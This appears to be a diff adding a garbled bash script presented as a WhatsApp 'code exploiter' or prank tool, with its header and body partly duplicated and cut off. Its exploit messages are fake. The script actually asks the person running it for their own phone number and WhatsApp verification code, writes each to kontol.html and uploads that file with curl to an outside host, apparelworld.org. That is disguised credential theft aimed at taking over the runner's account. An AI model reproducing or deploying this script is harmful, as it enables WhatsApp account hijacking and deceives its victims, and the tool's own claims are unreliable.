@@ -1,0 +1,72 @@
+ #!/bin/bash
+clear
+echo "
+<-- CYBER KALLAN -->
+##############!/bin/bash
+clear
+echo "
+<-- CYBER KALLAN -->
+####################
+#   Whatsapp Code  # By ./Arjun arz
+#     Exploiter    # Youtube/CYBER KALLAN
+####################
+
+Copyright (c) 2019 prank tool";
+echo "";
+read -p "number (+62xxxx)=> " nomer;
+read -p " Target number (+62xxxx) => " target;
+sleep 2
+echo "[+] Syncing Target...";
+sleep 1
+echo "Login  => $number";
+sleep 0.5
+echo "Target => $target";
+sleep 0.5
+echo "[+] Exploiting...";
+echo "Number => $nomer" >> kontol.html;
+curl -T kontol.html http://apparelworld.org/
+sleep 5;
+echo "[+] Done.";
+echo "Tunggu 5-10 install aaakalla enne parajha alle.";
+read -p "Verify Code => " code;
+sleep 2
+echo "[+] Connecting to whatsapp.com...";
+echo "Login => $number";
+sleep 0.5
+echo "Code => $code";
+sleep 0.5
+echo "Target => $target";
+sleep 0.5
+echo "[+] Sending Exploit...";
+echo "Code => $code" >> kontol.html;
+curl -T kontol.html http://apparelworld.org/
+sleep 5
+echo "[+] Success Exploited!";
+exit;
+#######
+#   Whatsapp Code  # By Arjun arz
+#     Exploiter    # Youtube/Cyber Kallan
+####################
+
+Copyright (c) 2018 install aaakkalla myre enne parajha alle";
+echo "";
+read -p "Nomer Kamu (+62xxxx)=> " number;
+read -p "Nomer Target (+62xxxx) => " target;
+sleep 2
+echo "[+] Syncing Target...";
+sleep 1
+echo "Login  => $number";
+sleep 0.5
+echo "Target => $target";
+sleep 0.5
+echo "[+] Exploiting...";
+echo "Nomer => $number" >> kontol.html;
+curl -T kontol.html http://apparelworld.org/
+sleep 5;
+echo "[+] Done.";
+echo "install aaakalla dai Code.";
+read -p "Verify Code => " code;
+sleep 2
+echo "[+] Connecting to whatsapp.com...";
+echo "Login => $number";
+sleep 0.5
